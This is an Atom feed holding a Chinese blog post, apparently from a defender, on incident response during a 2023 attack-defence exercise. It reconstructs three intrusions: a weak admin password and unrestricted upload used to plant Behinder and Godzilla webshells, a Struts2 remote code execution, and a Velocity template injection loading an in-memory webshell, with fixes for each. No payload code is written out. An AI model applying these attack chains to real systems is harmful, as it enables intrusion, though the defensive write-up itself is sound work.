<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://c2young.github.io</id>
    <title>c2young&#39;s blog</title>
    <subtitle>网络安全/红蓝对抗/漏洞挖掘/ctf比赛</subtitle>
    <icon>https://c2young.github.io/images/favicon.ico</icon>
    <link href="https://c2young.github.io" />
    <author>
      <name>c2young</name>
    </author>
    <updated>2024-01-17T08:01:49.000Z</updated>
    <entry>
        <id>https://c2young.github.io/2024/01/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
        <title>记一次攻防演练中的蓝队攻击排查以及应急响应</title>
        <link rel="alternate" href="https://c2young.github.io/2024/01/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
        <content type="html">&lt;p&gt;去年参加了一场大型攻防演练，作为蓝队防守方，第一次遇到实战中的攻击排查以及应急响应。因此写一篇博客记录一下，总结应急响应的流程，顺便回顾一下当时接触到的安全设备、流量分析等等。&lt;/p&gt;
&lt;h1 id=&#34;弱口令文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#弱口令文件上传漏洞&#34;&gt;#&lt;/a&gt; 弱口令 + 文件上传漏洞&lt;/h1&gt;
&lt;h2 id=&#34;攻击发现微步tdp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击发现微步tdp&#34;&gt;#&lt;/a&gt; 攻击发现（微步 TDP）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 01:25:37&lt;/p&gt;
&lt;p&gt;尝试漏洞扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C1.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 02:28:36&lt;/p&gt;
&lt;p&gt;弱口令登录（登陆成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;弱口令：admin/123456&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 02:30:26&lt;/p&gt;
&lt;p&gt;尝试文件上传（上传成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C4.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：08/18 02:32:27&lt;/p&gt;
&lt;p&gt;冰蝎 webshell 文件上传（上传成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C5.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C6.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 02:33:51&lt;/p&gt;
&lt;p&gt;哥斯拉 webshell 文件上传（上传成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C7.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C8.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：08/18 02:34:14&lt;/p&gt;
&lt;p&gt;连接哥斯拉 webshell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C9.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C10.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C11.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 02:50:30&lt;/p&gt;
&lt;p&gt;冰蝎 webshell 文件上传（上传成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C12.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C13.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：08/18 02:51:18&lt;/p&gt;
&lt;p&gt;连接冰蝎 webshell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5CCZY%5CAppData%5CRoaming%5Cmarktext%5Cimages%5C2024-01-17-16-46-18-image.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C15.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C16.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击分析排查应急响应深信服sip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击分析排查应急响应深信服sip&#34;&gt;#&lt;/a&gt; 攻击分析排查 / 应急响应（深信服 sip）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;攻击队通过跳板机对受害机器进行弱口令登陆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C17.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过上机排查发现晚上 2 点 30 分上传哥斯拉 jsp 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C18.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C19.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对木马文件进行删除处理&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看分析 web 日志&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C20.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现攻击队上传文件的接口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C21.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;后面有持续连接该 webshell 的记录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C22.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现只通过 js 代码限制类型文件上传，后端接口 thematic/updHomePagePicture.action 没有限制，建议对接口添加文件限制禁止任意文件上传&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看分析 Windows 安全日志&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C23.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 2 点 34 分后发现通过 3389 登录 administrator 账号登录成功，建议修改密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C24.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;无异常账号添加&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;封禁攻击 IP&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击路线&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击路线&#34;&gt;#&lt;/a&gt; 攻击路线&lt;/h2&gt;
&lt;p&gt;漏洞扫描（无果） =&amp;gt; 弱口令登录（成功） =&amp;gt; 尝试文件上传（成功） =&amp;gt; 上传冰蝎 webshell（文件名：1000kb.jsp）/ 上传哥斯拉 webshell（文件名：1000kbjsp） =&amp;gt; 连接哥斯拉 webshell（文件名：202308180233501000kb.jsp） =&amp;gt; 上传冰蝎 webshell（文件名：test.jsp） =&amp;gt; 连接冰蝎 webshell（文件名：20230818025029test.jsp）&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修复建议&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;弱口令：完善密码策略，密码长度至少为 8（包括）位以上字符，且包含数字、大小写字母、特殊字符。&lt;/li&gt;
&lt;li&gt;及时删除恶意样本 202308180233501000kb.jsp 、20230818025029test.jsp&lt;/li&gt;
&lt;li&gt;文件上传：对文件上传做严格的限制，从后缀名、文件头、文件内容等方面校验。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;struts2远程代码执行漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#struts2远程代码执行漏洞&#34;&gt;#&lt;/a&gt; Struts2 远程代码执行漏洞&lt;/h1&gt;
&lt;h2 id=&#34;攻击发现微步tdp-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击发现微步tdp-2&#34;&gt;#&lt;/a&gt; 攻击发现（微步 TDP）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 01:55:58&lt;/p&gt;
&lt;p&gt;尝试登录（未成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C25.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 01:57:52&lt;/p&gt;
&lt;p&gt;使用 Struts2 远程代码执行攻击（攻击成功）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C26.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C27.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击分析排查应急响应深信服sip-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击分析排查应急响应深信服sip-2&#34;&gt;#&lt;/a&gt; 攻击分析排查 / 应急响应（深信服 sip）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;攻击队通过跳板机对受害机器进行 Struts2 反序列化漏洞，查看返回包发现命令已经成功执行，修复建议升级 Struts2 组件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C28.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 web 日志&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C29.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现攻击队在晚上 1 点 57 分发起的攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C30.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;执行成功后，2 点 02 分后该 IP 没有访问 jsp 文件或者其他路由的内存马，也没有对受害机器进行访问了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看定时任务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C31.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;没有异常的定时任务行为&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 Tmp 目录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C32.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Tmp 目录下没有可疑文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;封禁攻击 IP&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击路线-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击路线-2&#34;&gt;#&lt;/a&gt; 攻击路线&lt;/h2&gt;
&lt;p&gt;尝试登录（无果） =&amp;gt; Struts2 远程代码执行攻击（攻击成功）&lt;/p&gt;
&lt;h2 id=&#34;修复建议-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修复建议-2&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;建议将 jar 包更新到最新版本；&lt;/li&gt;
&lt;li&gt;struts2 标签库的升级：将原有的 struts-tag.tld 升级为最新。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;velocity模板注入漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#velocity模板注入漏洞&#34;&gt;#&lt;/a&gt; velocity 模板注入漏洞&lt;/h1&gt;
&lt;h2 id=&#34;攻击发现微步tdp-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击发现微步tdp-3&#34;&gt;#&lt;/a&gt; 攻击发现（微步 TDP）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/18 20:14:40&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C33.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击分析排查应急响应深信服sip-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击分析排查应急响应深信服sip-3&#34;&gt;#&lt;/a&gt; 攻击分析排查 / 应急响应（深信服 SIP）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;SIP 告警 Java 代码注入攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C34.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分析流量包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C35.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查看攻击 payload&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解密 BCEL&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C36.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C37.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C38.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得出 class 类，class 类里面用 base64 加载恶意类，通过 base64 解密恶意类，发现哥斯拉连接信息 aeskey 和密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;清理了攻击者残留的内网扫描工具及结果文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;重启 JAVA 应用清理内存 webshell。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;封禁攻击 IP&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击路径&#34;&gt;#&lt;/a&gt; 攻击路径&lt;/h2&gt;
&lt;p&gt;velocity 模板注入攻击（攻击成功）&lt;/p&gt;
&lt;h2 id=&#34;修复建议-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修复建议-3&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h2&gt;
